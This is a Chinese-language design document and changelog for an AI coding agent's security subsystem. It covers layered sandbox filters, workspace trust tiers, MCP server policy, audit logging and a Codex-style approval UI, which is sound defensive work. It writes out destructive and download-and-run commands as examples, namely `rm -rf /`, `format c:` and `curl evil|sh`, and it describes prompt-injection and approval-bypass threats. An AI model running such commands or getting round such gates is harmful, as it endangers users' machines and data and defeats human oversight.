# 青小团 Agent 安全子系统

> 本文档是安全子系统的权威说明：架构、模块边界、决策树、审计闭环、威胁模型与增强路线图。
> 目标：让"允许什么、拒绝什么、为什么"在代码之外也能被快速核对，并给后续增强提供一致性锚点。

---

## 1. 设计原则

- **Fail-closed**：滤网自身故障、确认通道缺失、强隔离后端不可用、参数解析异常 → 一律拒绝，绝不静默放行。
- **可审计**：每条安全裁决（尤其拦截）都应汇入审计流，可离线追责。
- **确定性优先**：意图/信任/规则等静态判定不依赖任何内核/容器即可成立；没有强隔离时用滤网兜底，而不是裸跑。
- **统一入口，杜绝侧门**：所有工具经同一条安全流水线，避免"绕 run_shell 护栏走文件写/MCP"的旁路。

---

## 2. 整体架构

```
                    工具/命令请求
                          │
        ┌─────────────────▼────────────────────┐
        │  L0 意图滤网  IntentFilter             │ 红线/外泄/远程执行
        ├──────────────────────────────────────┤
        │  L1 信任滤网  TrustFilter              │ 工作区信任 / 域名白名单 / 计划模式
        ├──────────────────────────────────────┤
        │  L2 资源滤网  ResourceFilter           │ 网络开关 / 内存超时 / 隔离触发
        ├──────────────────────────────────────┤
        │  L3 强隔离滤网 HardIsolationFilter     │ 后端自动选择 / fail-closed
        └──────────────────────────────────────┘
                          │   Verdict (ALLOW/CONFIRM/ISOLATE/DENY)
                          ▼
             ┌ 允许 ┬ 确认 ┬ 隔离执行 ┬ 拒绝 ┐
             └──────┴──────┴─────┬───┴────┘
                           副本/diff/apply 或 强隔离后端
                          │
                          ▼
               SecurityAuditor / SecurityEventBus
               (AEAD 落盘, 防篡改链, 实时告警)
```

- 主链路位于 [`tuan_cli/sandbox/`](tuan_cli/sandbox/)（`SandboxManager` 统一入口）。
- 工具执行闸门位于 [`tuan_cli/core/tool_executor.py`](tuan_cli/core/tool_executor.py)（`_security_gate_check` + `_sandbox_gate_check`）。

---

## 3. 四层沙箱滤网

| 层 | 模块 | 职责 | 裁决落点 |
|----|------|------|----------|
| L0 意图 | `sandbox/filters.py::IntentFilter` | 硬红线(`rm -rf /`/`format c:`)、数据外泄、远程执行 → deny-critical/high | 模型无关、确定性最强 |
| L1 信任 | `sandbox/filters.py::TrustFilter` | 工作区信任分级(trusted/limited/untrusted/unknown) + 域名白名单 + 计划模式 | trusted 放行 / untrusted 拒 / unknown 确认 |
| L2 资源 | `sandbox/filters.py::ResourceFilter` | **可选**禁网开关 (`sandbox.resource.deny_network_by_default`，默认**关闭**)；高危写 → 副本模式 | 决定"上不上 L3" |
| L3 强隔离 | `sandbox/filters.py::HardIsolationFilter` | 后端自动选择；需强隔离但无强后端 → **fail-closed 拒绝** | 真正的容器/OS 隔离 |

**隔离后端自动选择**（强度降序探测）：`landlock → docker → seatbelt → token-acl → jobobject → local`。
见 `sandbox/backends.py`。

**工作区隔离融合模式**：`direct`（限路径直写，低危）+ `copy-diff-apply`（副本 → diff → 确认 → 应用，高危可回滚）。见 `sandbox/isolation.py`。

**决策模型**：`sandbox/verdict.py::Verdict`，动作按严格度 `ALLOW < CONFIRM < ISOLATE < DENY` 逐层收紧。

---

## 4. 安全模块职责与边界

| 模块 | 文件 | 职责边界 |
|------|------|----------|
| 红线引擎 | `ext/safety_engine.py` | 命令/SQL/写操作的静态风险评分；硬红线/软红线/良性判断 |
| 安全闸门 | `ext/security_gate.py` | 统一 `SecurityGate`：shell/MCP 工具/远程 prompt/文件写入/未知 kind |
| 规则引擎 | `ext/rules_engine.py` | YAML 规则加载校验；ReDoS 防护、secret 检测 |
| 安全策略 | `ext/security_policy.py` | 黑名单/策略月度更新提醒 |
| 加密引擎 | `ext/crypto_engine.py`、`harden/crypto_provider.py` | PBKDF2+AES-GCM/CTR+HMAC；可插拔后端，解密认证失败 fail-closed |
| 网络守卫 | `core/network_guard.py` | 网络命令识别；敏感域名/IP/CIDR/单向模式（出口策略权威判定） |
| 审计器 | `core/security_auditor.py` | AEAD 加密落盘、防篡改链、查询/统计/导出 |
| 事件总线 | `core/security_bus.py` | 统一定向事件；含沙箱事件(`security.sandbox.*`)，实时告警 |
| 工作区信任 | `core/workspace_trust.py` | `trusted/limited/untrusted/unknown` 分级与落盘 |
| 白名单 | `core/whitelist.py` | 只读命令白名单、确认码、多阶段确认 |
| MCP 加固 | `tools/mcp/security.py` | 注册描述扫描、参数注入检测（独立威胁类） |
| 权限规则 | `tools/permissions.py` + `permission_fusion.py` | `permissions.rules` 规则表 / shell / network 策略决策 |
| 沙箱统一入口 | `sandbox/manager.py` | 四层滤网评估 + 审计闭环 + 隔离执行选路 |

---

## 5. 关键决策树

### 5.1 网络出口（权威判定 = `NetworkGuard.check`）
- **L0 意图滤网**：消费 `guard.check().action == "deny"`（外泄/远程执行/敏感域名/端口扫描/CIDR 越界）→ 沙箱 deny high。**不负责**白名单强制。
- **L1 信任滤网**：负责**域名白名单强制**（`payload.meta.allowed_domains` ← `sandbox.allowed_domains` / `permissions.network.allow_domains`）。
- **L2 资源滤网**：负责**存在性 + 无网开关**：检测到网络请求且 `deny_network_by_default` 开启 → `network=False + isolate=True`（气隙执行）。**该开关默认关闭**，即开箱不禁用出网；生产配置见 `SECURITY_BASELINE.md`。网络探测自身异常时按「存在网络请求」处理（fail-closed）。本地命令不受影响。

> 一致性契约：被 `NetworkGuard` 判 deny 的命令，沙箱 L0 必须 deny 且严重度一致（high）。

### 5.2 信任分级
- `unknown` → 确认；`untrusted` → 拒绝；`limited` → 白名单外确认；`trusted` → 放行。
- 计划模式（plan_mode）一律降级为"只读确认"。

### 5.3 MCP 校验点（两类互补威胁）
- **红线层**（命令级致命）：`SecurityGate.decide_mcp_tool`；无 gate 兜底 `_is_mcp_dangerous` → 两者**全字段递归红线，覆盖一致**。
- **注入层**（指令覆盖/角色劫持）：`MCPSecurityGuard.scan_tool_params` → 独立拦截。
- 两类不互相吞，是纵深防御的分工，不是重复。

---

## 6. 审计闭环

- 每条沙箱裁决（DENY 全量；CONFIRM/ISOLATE 仅高危以上）经 `SandboxManager._emit_audit` 汇入：
  - `SecurityAuditor`：AEAD 加密落盘 + 防篡改链（含 layer/tool/trust/backend 等上下文）。
  - `SecurityEventBus`：`security.sandbox.blocked/isolated/confirmed` → `security-audit.jsonl` + critical/high 实时告警 + 导出。
- 审计是补充保障：任何审计异常都被吞掉，**绝不反噬沙箱主流程**。
- 导出格式：JSONL / CEF / RFC5424 Syslog（`harden/audit_export.py`）。

---

## 7. 威胁模型（已覆盖）

| 威胁 | 防线 | 状态 |
|------|------|------|
| 致命命令破坏主机 | L0 意图滤网 / 红线引擎 / 强隔离后端 | ✅ |
| 工作区外不可信代码 | 工作区信任分级 + 路径限界 + 副本模式 | ✅ |
| 数据外泄 / 远程执行 | NetworkGuard + L0 + L2 无网隔离 | ✅ |
| MCP 恶意 server 参数注入 | 注册描述扫描 + 参数注入检测 + 全字段红线 | ✅ |
| 提示词注入(指令覆盖) | 注入检测层（独立于红线） | ✅ |
| 审计被篡改 / 明文泄露 | AEAD 加密 + 防篡改链 | ✅ |
| 滤网/后端故障被绕过 | 全栈 fail-closed | ✅ |

---

## 8. 增强路线图（按价值排序）

| # | 模块 | 增强方向 | 状态 |
|---|------|----------|------|
| E1 | `tools/mcp/policy.py` + `security.py` | MCP **server 信任分级**：把每台 server 的权限域(只读/工具白名单/允许的域名)落到持久化策略；新增"调用前工具级授权 + 会话内可回撤"，取代散落的临时确认 | ✅ 已落地 |
| E2 | `core/workspace_trust.py` | 信任**自动衰减与重校验**：trusted 在目录变更/新敏感文件(.env/.git/config/密钥)出现时自动降级到 limited 并提示复议 | ✅ 已落地 |
| E3 | `sandbox/backends.py` + `arch/platform.py` | **Job Object 资源配额落地**：CPU 配额、内存上限、进程树击杀超时兜底(当前仅存在性探测) | ✅ 已落地 |
| E4 | `core/security_auditor.py` + `harden/audit_export.py` | 审计**关联合并 + 跨会话异常检测**：同源多次红线(如 MCP 反复注入)聚合告警；导出支持轮转与加密 | ✅ 部分（关联/轮转已落地，导出加密未做） |
| E5 | `core/tool_executor.py` | **写操作风暴检测**：单会话内高频率写/删除触发节流与告警，防误删批量任务 | ✅ 已落地 |
| E6 | `tools/permissions.py` | `permissions.rules` 增强：**负向 glob**(`!bin/**`)、MCP 工具名规则、会话内临时授权提升 | ◐ 部分（前两项已落地） |
| E7 | `sandbox/isolation.py` + `ui/approval_overlay.py` | 副本模式的 **diff 可视化确认**：以 CLI/交互卡片展示变更后再 apply | ✅ 已落地（后端 + 审批卡片） |
| E8 | `config` | `sandbox`/`permissions` 配置的 **schema 强校验 + fail-closed 可观测性**（开启项/降级项可视化） | ✅ 已落地 |

> 判定"先做哪些"：优先级高且可独立演进 → **E2、E3、E5**（已落地）；依赖交互设计 → **E1、E7**（后端 + 审批卡片已落地）；属加固打磨 → **E4、E6、E8**。

**E2 落地说明（2026-11-06）**：此前 `check_for_decay()` / `apply_decay()` 只有单元测试调用，
CLI (`cli/cmd_chat.py`) 与 Web (`web/server.py::trust_status`) 都直接读 `record.level`，
衰减逻辑从未在主链路生效。现在 `check_trust()` 自动执行衰减校验并统一 CLI / Web / 沙箱口径：

- 指纹基线：确认 trusted 时采样「顶层目录结构 + 敏感文件 (`.env`/密钥/`.git/config` 等) 的
  路径、大小、mtime_ns」，写入持久化记录；之后任一变化即降级为 limited 并要求重新确认。
  扫描限深 4 层 / 限 20000 条目 / 跳过依赖与构建目录，不读文件内容，正常写代码不会误触发。
- **fail-closed**：扫描失败（目录消失、权限错误、条目超限）不再 `except: pass` 静默放行，
  而是降级为 limited；老版本无指纹的记录只补建基线，不每次启动误报。
- `last_used` 由 `check_trust` 自动维护（60 秒节流落盘），修掉「活跃工作区 30 天后被误判过期」。
- 降级原因 / 时间写入 `TrustRecord`，经 `get_project_info()` 暴露给 Web 与 TUI 提示。
- 回归：`tests/test_e2_e5_hardening.py`（16 例）。

**E5 落地说明**：`_WriteStormDetector` 已接入 `ToolExecutor`，但「不同文件数」按整个会话累计，
一旦改过 15 个文件就永久告警、与 60 秒滑动窗口矛盾。现在文件维度与次数维度共用同一窗口，
告警态随窗口过期复位，并修正了把「写操作次数」误写成「秒数」的文案。

**E6 部分落地说明（2026-11-06）**：`PermissionPolicy.match_rule()` 新增两类能力：

- **负向排除**：规则支持 `exclude: "git push --force*"` 或 `pattern: "!git push --force*"`。
  目标命中排除模式时该规则不生效，用于给宽泛 allow 开洞，避免「永远允许」成为提权入口。
  **deny 规则忽略 exclude**（fail-closed：拒绝规则不允许被放宽），优先级仍为 deny > ask > allow。
- **MCP 工具名规则**：`mcp_call` 按 `mcp__<server>__<tool>` 规范化参与 tool 匹配，
  可写 `{"tool": "mcp__untrusted__*", "action": "deny"}` 对单台 server 精确管控。
- 仍待办：会话内临时授权提升（依赖交互设计，未动）。
- 回归：`tests/test_e6_e8_hardening.py`（21 例）。

**E8 落地说明**：新增 `config/security_schema.py`，把此前完全不在 `config/validate.py`
校验范围内的 `sandbox` / `permissions` 纳入强校验。最危险的不是配错值而是**静默配错**：
`match_rule()` 对非 dict 规则 / 未知 action 一律跳过，`sandbox.enabled=false` 直接短路四层滤网。
现在这些会变成 `tuan config validate` 的显式错误，并由 `tuan harden status` 输出
「安全配置 schema」段。缺失字段不报错（由 DEFAULT_CONFIG 兜底），只报显式写错或显式关闭关键防线。

**R8 同类异常即放行修复**：`PermissionPolicy._hardening_confirm()` 在安全引擎导入失败时
`except: pass` 后继续走 YOLO 自动批准 —— 超长命令 / FD 重定向 / PowerShell IEX /
Docker 守护进程重定向都会在引擎不可用时被静默放行。现改为返回 `confirm` 并标注 fail-closed。



**E3 落地说明（2026-11-06）**：最值钱的不是"补上 CPU 配额"，而是修掉**降级被误报为已隔离**：
`SandboxManager._run_syscall()` 旧实现把 `enforced=True` 写死，只要 platform 层不抛异常，
即使内部已因 libseccomp 缺失 / Job Object 不可用而退化为普通子进程，上层仍认为
"已 OS 级强隔离执行"并放行。现在 `SyscallResult` 带 `enforced` / `degraded_reason`，
所有 fallback 路径显式 `enforced=False`，交由 `enforce_required` 决定是否拒绝。

- `arch/platform.py`：新增 `JobObjectLimits` 纯数据层（含范围校验、单位换算）；
  `_set_job_limits()` 两次 `SetInformationJobObject` —— class 9 落内存/workingset/进程数、
  class 15 落 CPU 硬上限（`ENABLE|HARD_CAP`，`CpuRate` 单位=百分数×100）。
  旧实现 `cpu_rate_pct` **完全没被使用**，`MaximumWorkingSetSize` 也缺
  `JOB_OBJECT_LIMIT_WORKINGSET` flag 而不生效。
- **fail-closed**：`AssignProcessToJobObject` 失败时旧实现 `pass` 后照跑、却仍返回
  `mechanism="job-object"`；现在杀掉子进程并返回 `blocked=True / enforced=False`。
  配额设置任一步失败即抛错，不再"配额没设上却照跑"。
- 进程树击杀超时兜底：`TerminateJobObject` → `taskkill /T /F` → `proc.kill()` 三级。
- `backends._jobobject_available()` 从「`sys.platform == "win32"` 就算可用」改为真实
  `CreateJobObjectW` + `QueryInformationJobObject` 能力探测。
- 新配置键 `sandbox.resource.cpu_rate_pct / active_process_limit / kill_timeout_seconds`，
  已纳入 `tuan config validate` 强校验（写错范围执行层会降级, 必须提前拦住）。
- **边界（如实）**：Job Object 只在 Windows 生效；本环境为 Linux，Windows 路径由
  fake kernel32 / fake Popen 单测覆盖，**未在真实 Windows 主机上跑过**。Linux/macOS
  仍须靠外部容器或 VM，`enforced=False` 只是让降级可见，不提供额外隔离。

**E4 落地说明（部分）**：新增 `core/audit_correlation.py`。此前审计是逐条的，
1000 条 `deny` 只是 1000 行日志，同源反复注入看不出异常。

- `AuditCorrelator` 产出三类聚合告警：`burst`（窗口内同源重复）、`cross_session`
  （同一指纹出现在 ≥2 个会话，抓跨会话投毒/提示注入复用）、`severity_escalation`
  （同源从 low 跃升 critical）。指纹不含 session/seq/ts，并归一化掉路径与数字。
- **纯观测，绝不反作用于裁决**：不改 `AuditRecord`、不返回 allow/deny、异常一律吞掉记 log；
  告警只推送到**已存在**的全局事件总线（不主动创建以免副作用）。
- `SecurityAuditor` 启动时从 AEAD 日志 `replay()` 历史，使跨会话检测能跨越进程重启；
  `recent_alerts()` / `correlation_stats()` / `stats()["correlation"]` 可查。
- `harden/audit_export.py`：导出支持按大小轮转（`max_bytes` / `backup_count`），
  文件权限收紧到 0600；`export_file()` 批量重放同样生效。
- **仍待办**：导出加密。审计主日志本身已 AEAD 加密，但导出到 SIEM 的明文轮转文件
  需要独立的密钥管理方案，未擅自塞进本轮。
- 回归：`tests/test_e3_jobobject.py`（25 例）、`tests/test_e4_correlation.py`（24 例）。



**E1 落地说明（2026-11-06）**：新增 `tools/mcp/policy.py`。此前 `mcp/security.py` 只扫描
工具描述/参数里的注入文本（内容层），不回答「这台 server 到底被允许做什么」——所有 MCP
调用只能按外层 `mcp_call` 一刀切放行/拒绝。

- `MCPPolicyStore` 持久化每台 server 的权限域：`tier`（`untrusted`/`limited`/`readonly`/
  `trusted`）、`read_only`、`tool_allowlist`、`tool_denylist`、`allowed_domains`、
  `max_calls_per_session`、`require_confirm`，原子写入 `~/.tuan/mcp_server_policy.json`（0600）。
- **默认 untrusted**：未登记 server 一律拒绝，必须用户显式 `grant()` 后才可用；第一次见到
  不等于临时放行。`trusted` 档强制要求显式 `tool_allowlist`，拒绝「无白名单 = 全放行」的过宽授权。
- **deny 优先**、域名白名单（含嵌套参数里的 URL）、会话调用配额、**会话内可回撤**
  （`revoke_session()` 后立刻重新要求确认，不需重启）。
- **损坏即拒绝**：策略文件损坏 / 版本不认识时进入 `locked` 状态拒绝所有调用，**不重建为
  空策略**——空策略看起来像「没有限制」，与「无法验证」的语义正好相反。
- **接线（关键）**：由 `build_permission_policy()` 注入全局 store，主链路 `mcp_call` 真的经过
  信任分级；单元测试直接构造 `PermissionPolicy` 时不受影响。策略层初始化失败时注入
  `_DenyAllMCPPolicy` 而不是 `pass` 回退到裸路径。新配置键 `mcp.policy.enabled`（缺省启用）
  已纳入 E8 强校验，显式关闭会报「安全降级」。
- **TUI 卡片已落地**：`request_grant()` 通过 `ui/approval_overlay.py` 呈现完整权限域
  （tier / allowlist / denylist / domains）并路由显式决策；「仅本会话」走内存临时策略不写盘，
  「授予并持久化」才调 `grant()`。拒绝 / 中止 / 通道异常一律不改策略。见下方 TUI 外壳借鉴说明。

**E7 落地说明（2026-11-06）**：本轮发现两个比"加个预览"严重得多的问题。

1. **`copy_diff_apply` 是纯文档特性**：L2 滤网在高危时把 `verdict.workspace_mode` 写成
   `copy_diff_apply` 并进审计 context，但 `SandboxManager.execute_isolated()` **从未读取该字段**，
   `isolate_workdir` / `diff` / `apply` 在生产代码里零调用点 —— 高危命令实际仍在真实工作区裸跑。
   现在按 `workspace_mode` 分派，高危命令真的在隔离副本里执行，经预览 + 确认后才写回。
2. **快照漏扫隐藏目录，确认界面说谎**：`Snapshot.capture()` 用
   `not d.startswith(".")` 跳过所有点目录，于是副本里改 `.github/workflows/ci.yml` 时
   `diff()` 返回空 —— 用户看到「无变更」。实测确认后改为只跳过 `_IGNORED` 与隔离副本自身。

- 新增 `DiffPreview` / `DiffEntry`：每条变更带 `path/status/size_before/size_after`、
  **文本内容前 20 行预览**（用户能看见那一行是不是 `curl evil|sh`，而不只是文件名）、
  二进制标注、`.env`/私钥/credentials 等敏感文件 `[!敏感]` 高亮；`to_text()` 纯文本渲染
  可直接 print 或塞进 TUI 卡片。
- `confirm_apply()` fail-closed 契约：`confirm` 为 None / 抛异常 / 返回非 True → 不写回；
  **TOCTOU 复检** —— 确认期间副本发生变化则拒绝并要求重新预览。刻意不引入快照缓存，
  避免「判定依赖文件系统时间点」。
- `SandboxExecResult` 新增 `workspace_mode` / `applied` / `applied_files` / `diff_preview` /
  `confirm_reason`；拒绝时把预览一并放进 `error`，保证用户仍能看见本来要改什么；
  副本在 `finally` 里必定清理。
- **TUI 卡片已落地**：`confirm_apply()` 接受 `card_renderer`，由
  `ui/approval_overlay.py` 渲染结构化审批卡片；有 `ctx.confirm` 时交给现有 TUI 挂起式
  确认通道，无通道时提供 headless 默认通道（打印卡片 + 精确 6 位确认码 + stdin，
  非 TTY/EOF 即 ABORT）。**行为变更**：上一轮「无 confirm 通道直接失败」的 headless 缺口
  已补上，但**没有放宽 fail-closed** —— 只是提供了一个同样要求显式决策的通道。
- **边界（如实）**：TUI 复用的是现有 `confirm()` 文本框渲染通道，**没有**把
  prompt_toolkit 应用整体换成 ratatui 式 Widget/Buffer 架构（理由见下方借鉴说明）；
  TUI 路径走 y/n（`_resolve_confirm`），不显示确认码提示，卡片文案与通道行为一致，
  不出现「写着要输码、实际按 y 就放行」。`copy_diff_apply` 与 OS 强后端叠加时后端在副本
  cwd 内执行，未对 Windows Job Object 做真机验证（同 E3 边界）。
- 回归：`tests/test_e1_e7_hardening.py`（39 例）、`tests/test_tui_approval_overlay.py`（59 例）。



**TUI 外壳借鉴说明（Codex CLI，2026-11-06）**：按需求把 `openai/codex` 的 TUI 源码
**完整下载到本地核查**（`codex-rs/tui/`，Rust + ratatui + crossterm + tokio，
**165 个顶层模块、1216 个 `.rs` 文件、492414 行**（另跳过 1491 个快照文件），
  并**完整照抄**其 `LICENSE` 与 `NOTICE` 原文到
`THIRD_PARTY_LICENSES/`（Apache-2.0 第 4 条与上游 NOTICE 的归属要求）。

**但 TUI 源码没有逐字复制，本项目也不宣称做了逐字复制。** 两个硬理由：

1. **跨语言不可行**：上游 `codex-tui` 是独立 Rust crate，渲染建立在 ratatui 的
   `Widget`/`Buffer` trait 与 crossterm 事件循环上；Tuan-CLI 是纯 Python +
   prompt_toolkit/rich。逐字搬 49.2 万行 Rust 进 Python 仓库没有可执行语义。
2. **整体替换 TUI 外壳会重新打开侧门**：权限策略注入（`build_permission_policy`）、
   确认通道（`ctx.confirm`）、沙箱路由（`_route_sandbox_isolation`）都挂在现有 TUI
   入口上。换壳等于把 E1–E8 修好的接线全部甩掉 —— 这正是前几轮反复在堵的问题。

因此采取**等价移植交互外壳**：把上游 `bottom_pane/approval_overlay.rs` 的组件分层
（`ApprovalRequest` → 选项列表 → 显式决策事件 → 路由）与四条交互契约，
用 Python 独立实现并**内联**到 `tuan_cli/ui/approval_overlay.py`；卡片排版沿用
Tuan 现有 `_render_confirm_card` / `_render_ask_card` 的盒子渲染器，不引入 ratatui。

借鉴的四条契约（均已在代码中落地并有回归覆盖）：
1. **选择总是发出显式决策事件** —— 没有「没输入 = 同意」；
2. **Esc / 取消永远映射 Cancel/Abort** —— 上游对 MCP elicitation 特别保证「关闭对话框
   不会静默变成 continue without info」，这里 ABORT 优先于确认码校验；
3. **UI 层不判定安全性** —— 上游原文 "This module does not evaluate whether an
   action is safe to run; it only presents choices and routes user decisions."；
   安全裁决仍由 E1 策略库与 E7 `confirm_apply` 负责；
4. **作用域区分**（`Accept` / `AcceptForSession`）→ `ONCE` / `SESSION`。

相对上游的修改也如实记录：请求模型改为 Python dataclass；决策解析 fail-closed
（未知输入 RETRY、错码 DENY、非 TTY headless 用 6 位确认码、stdin 不可用 ABORT）；
新增 E1 持久化信任授予流程与 E7 结构化 DiffPreview 卡片（上游均无对应物）。
归属、许可全文与「OpenAI 不背书」声明见 `NOTICE` 第 9 条。



**TUI 对齐矩阵（2026-11-06，第 10 轮）**：目标「TUI 与 Codex 完全相同但保留本地化」
已拆成可度量条目，见 `TUI_PARITY.md` 与 `tuan tui parity`。

- 新增 `tuan_cli/tui/parity/`：`upstream_spec.py`（165 模块树 / 布局常量 /
  键位规格规范化）、`keymap.py`（8 context / 82 动作 / 74 已绑定的 Codex
  `built_in_defaults` + `RuntimeKeymap` 解析：context→global→defaults 优先级、
  显式解绑、唯一性冲突、保留键 `ctrl-c`）、`i18n.py`（17 条文案 → 10 语言，
  en / zh-CN 全量）、`matrix.py`（逐模块状态与差距队列）。
- **键位改为 Codex 原生**：`y` 批准 / `a` 本会话 / `p` 前缀 / `d` 拒绝 /
  `n` 拒绝并说明 / `c` 中止；新增 `PREFIX` / `DECLINE` 决策。上一轮的
  `s` / `1` / `2` 等保留为本地化兼容别名。`Esc` 仍为 `ABORT`（比上游 exec
  模式的 decline 更严格，`TUI_PARITY.md` §6 如实标注）。
- **布局常量逐值对齐**：`LIVE_PREFIX_COLS=2` / `MAX_POPUP_ROWS=8` /
  `MIN_LIST_WIDTH_FOR_SIDE=40` / `SIDE_CONTENT_GAP=2` /
  `MENU_SURFACE_HORIZONTAL_INSET=4` / `MAX_KEY_CHORD_STROKES=2`。
- **口径更正**：完整解压后上游为 165 模块 / 1216 个 `.rs` / 492414 行
  （跳过 1491 个快照），不是上一轮的 567 / 24.7 万行。所有旧数字引用已修正。
- **当前指标（不虚报）**：aligned 14、localized 57、not_applicable 63、
  **pending 31**；宽口径 81.2%、严格对齐 43.0%、**逐值对齐仅 8.5%**；
  `fully_identical = false`。`tuan tui parity --gaps` 列出 31 个待办模块，
  `TUI_PARITY.md` §5 给出第 11–15 轮清零路线。**不靠改状态定义凑数。**
- **本地化边界**：键位 / 布局 / 组件树 / 交互契约不改（这就是「完全相同」的
  锚点）；只改文案、模型、路径、配色、渲染后端与审批作用域语义。
- 回归：`tests/test_tui_parity.py`（新增）+ 既有 `test_tui_approval_overlay.py`
  / `test_e1_e7_hardening.py` 已适配 Codex 键位，102 例通过。
- 归属：`NOTICE` 第 10 条、`TUI_PARITY.md` §8；**仍未逐字复制任何 Rust 源码**。

**输入/终端能力对齐层（2026-11-06，第 11 轮）**：`input_keymap` 组 7 个待办
模块全部清零，`tuan tui parity` 指标更新为 aligned 21 / localized 57 /
n/a 63 / **pending 24**，宽口径 85.5%、严格 47.3%、**逐值对齐 12.7%**，
`fully_identical` 仍为 `false`（如实）。

- 新增 `tuan_cli/tui/inputkit/`（纯 Python，零 Rust 源码）：`vim_search`
  （字面匹配 + 完整 grapheme）、`activation_key_guard`（1s 双窗口 +
  Press/Repeat/Release 状态机）、`copy_input_guard`（RAII 释放，
  **异常路径也释放**）、`custom_terminal`（双缓冲 diff / 行尾单条
  `ClearToEnd` / `AlwaysUpdate` 保留 / 宽字符跨界 / BSU-ESU 同步帧 /
  Drop 恢复光标）、`terminal_program_status`（OSC 7501/21337、VTE 5400
  阈值、去重缓存、`;`/`\` 转义）、`terminal_hyperlinks`（8192 字节上限、
  17 项扩展名白名单、canonicalize 逃逸校验、symlink 拒绝、图片魔数
  探测、OSC 8 不影响几何）、`terminal_visualization_instructions`
  （feature gate + 中文常量，ASCII-only 约束不变）。
- **安全增强（比上游更严格，不是放宽）**：`web()` 增加 http/https
  scheme 白名单与 OSC/BEL 控制字符拦截（上游 `web()` 不校验目的地）；
  终端状态默认 **no-op writer**，未显式 `configure()` 绝不写转义序列；
  detail 先剥离控制字符并限长再转义；工作区文件校验对 symlink 祖先
  fail-closed。这补的是「终端解释 OSC 序列」这条攻击面。
- **许可特别说明**：`custom_terminal.rs` 上游明确标注派生自
  `ratatui::Terminal`、采用 **MIT**（Florian Dehau / The Ratatui
  Developers）。`NOTICE` 第 11 条与 `TUI_PARITY.md` §8 记录双重归属，
  MIT 全文在 `THIRD_PARTY_LICENSES/Codex-NOTICE.txt`。
- **本地化如实标注**：grapheme 分段用 stdlib `unicodedata` 的 UAX #29
  **近似**实现，不声称与 Rust `unicode-segmentation` 逐字节一致；kitty /
  sixel 图片协议不实现（属 `not_applicable`），字段保留为空不谎称支持。
- 回归：`tests/test_tui_input_layer.py` **88 例**通过；上一轮
  `test_tui_parity.py` 指标断言同步到 24 / 85.5% / 47.3% / 12.7%，
  并新增派生一致性校验（防以后改状态定义凑数）。
- 下一轮：`core_app` 组 9 个（`app_event` / `chatwidget` 状态机与事件路由），
  **保留现有权限策略注入与沙箱接线**。

**应用核心对齐层（2026-11-07，第 12 轮）**：`core_app` 组 9 个待办全部清零，
`tuan tui parity` 指标更新为 aligned 30 / localized 57 / n/a 63 /
**pending 15**，宽口径 90.9%、严格 52.7%、**逐值对齐 18.2%**，
`fully_identical` 仍为 `false`（如实）。

- 新增 `tuan_cli/tui/corekit/`（纯 Python，零 Rust 源码复制）9 个模块：
  `app`（32768 通道容量 / AppRunControl / ExitReason / 可恢复判定）、
  `app_backtrack`（六步 Esc/Enter 状态机 / `base_id` 变更失效）、
  `app_command`（Redacted newtype / 命令类型化 / proof 不进录制）、
  `app_event`（类型化事件 / Ops 不双记 / 分类枚举）、
  `app_event_sender`（voice_only 白名单 / 吞错记日志 / 10 个便捷方法）、
  `app_info`（wire→domain 显式转换 / 15·6·11·1·3 字段）、
  `chatwidget`（committed + active cell / live tail 缓存 / 双生命周期 busy）、
  `cli`（公开/内部 flag 分离 / 两条审批冲突）、
  `resize_reflow_cap`（1000·9001·3500·10000 四档 / 三态 / VSCode probe 优先）。
- **三条最值钱的安全契约**：
  1. **脱敏 newtype**：上游把 ICE 凭据与语音文本排除在诊断/会话录制外
     （Debug / Serialize 恒 `<redacted>`，明文只在信令边界还原）。本地化
     更严：`repr` / `str` / f-string / `to_dict` / `==` 全脱敏，
     `reveal()` 是唯一出口且带调用计数。
  2. **审批冲突 fail-closed**：`mark_tui_args` 让「危险绕过审批与沙箱」
     与 `approval_policy`、`auto_review` 与 `approval_policy` 互斥。若
     静默共存就是「以为设了审批策略、实际被绕过开关吃掉」的配置侧门。
     本轮做成结构化拒绝，并接入 `corekit_validate()`。
  3. **既有安全接线保护**（用户明确要求）：`app.assert_wiring_intact()`
     真实 import 现有模块，逐项验证 6 条 —— `build_permission_policy`
     注入、`_DenyAllMCPPolicy` 返回 deny、`ctx.confirm` 通道、
     `make_confirm_callable` 卡片接线、`confirm_apply` 副本确认、
     `ABORT` 显式决策（无输入 / Esc 绝不变成同意）。它接入
     `corekit_validate()` / `parity_validate()` / 回归集，**任何为对齐而
     重写入口的改动会先被测试拦下**。本轮**没有替换任何现有运行时对象**。
- 另外两条正确性修复点：`bind_thread()` 在线程变化时强制作废旧选择、
  `confirm_revert()` 二次校验线程（防 A 会话的 revert 落到 B 会话）；
  chatwidget 的 `agent_turn_running` 与 `mcp_startup_status` 两个独立
  生命周期派生单一 busy 指示器（防 MCP 启动期间误报空闲导致重复提交）。
- **本地化安全增强（比上游更严格）**：有界事件队列（满则拒绝计数）、
  未知事件名不进 inbound 日志、`app_info` 严格字段白名单 + http/https
  URL 校验、空 thread_id 的 `SubmitThreadOp` 直接拒绝、非法重排上限
  fail-closed 回退保守 fallback。
- **如实边界**：OpenAI 专属（实时语音、云提交、连接器、插件、daemon、
  worktree）标 `not_applicable` / 未实现，仅保留变体名供白名单契约核验；
  `MAX_REPLAY_TRANSCRIPT_CELLS` 的上游依赖常量本地不存在，fallback
  取显式本地默认 1000、`MAX_PENDING_TRANSCRIPT_CELLS=8`，均非逐值复制。
- 回归：`tests/test_tui_core_app_layer.py` **76 例**通过；
  `test_tui_parity.py` 指标同步到 15 / 90.9% / 52.7% / 18.2%，派生
  一致性校验保留。
- 下一轮：`config_models` + `misc`（5）与 `streaming_async` +
  `tools_exec` + `history_transcript`（5），仍**保留现有安全接线**。

**配置/侧栏对齐层（2026-11-07，第 13 轮）**：`config_models` + `misc`
组 5 个待办全部清零，`tuan tui parity` 指标更新为 aligned 35 /
localized 57 / n/a 63 / **pending 10**，宽口径 93.9%、严格 55.8%、
**逐值对齐 21.2%**，`fully_identical` 仍为 `false`（如实）。

- 新增 `tuan_cli/tui/configkit/`（纯 Python，零 Rust 源码复制）5 个模块：
  `additional_dirs`（4 早退分支 / 警告原文 / 忽略即拒绝）、
  `collaboration_modes`（tui_visible 筛选 / 2s 发现 / 失败不冒充空）、
  `model_migration`（三态 Outcome / 强制与可选键位 / 单次模板替换）、
  `sidebar_chooser`（`WIDE_WIDTH=58` / 窄屏双行 / `choice_at` 命中）、
  `sidebar_tab_strip`（三态 TabState / `targets()` 几何 / add 优先命中）。
